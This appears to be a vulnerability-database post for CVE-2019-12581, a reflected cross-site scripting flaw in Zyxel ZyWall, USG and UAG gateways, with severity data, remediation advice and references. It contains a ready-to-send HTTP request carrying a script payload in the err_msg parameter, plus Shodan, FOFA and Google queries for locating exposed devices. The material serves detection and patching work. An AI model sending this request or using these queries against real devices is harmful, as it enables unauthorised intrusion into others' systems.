---
layout: post
cve_id: CVE-2019-12581
title: Zyxel ZyWal/USG/UAG Devices - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2019/CVE-2019-12581.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-12581.yaml
snort2_rule: N/A
snort3_rule: N/A
author: n-thumann
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary script code in the context of the victim''s browser, leading to
  session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Apply the latest firmware update provided by Zyxel to fix the XSS vulnerability.

  '
reference:
- https://www.zyxel.com/support/vulnerabilities-related-to-the-Free-Time-feature.shtml
- https://sec-consult.com/vulnerability-lab/advisory/reflected-cross-site-scripting-in-zxel-zywall/
- https://n-thumann.de/blog/zyxel-gateways-missing-access-control-in-account-generator-xss/
- https://nvd.nist.gov/vuln/detail/CVE-2019-12581
- https://www.zyxel.com/us/en/
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2019-12581
  cwe-id: CWE-79
  epss-score: 0.55651
  epss-percentile: 0.9799
  cpe: cpe:2.3:h:zyxel:uag2100:-:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: zyxel
  product: uag2100
  shodan-query: http.title:"ZyWall"
  fofa-query: title="zywall"
  google-query: intitle:"zywall"
tags:
- cve
- cve2019
- zyxel
- zywall
- xss
- vuln
---

## üîç Vulnerability Description
Zyxel ZyWall, USG, and UAG devices allow remote attackers to inject arbitrary web script or HTML via the err_msg parameter free_time_failed.cgi CGI program, aka reflective cross-site scripting.

## üåê HTTP Request
```nohighlight
GET /free_time_failed.cgi?err_msg=<script>alert(document.domain);</script> HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

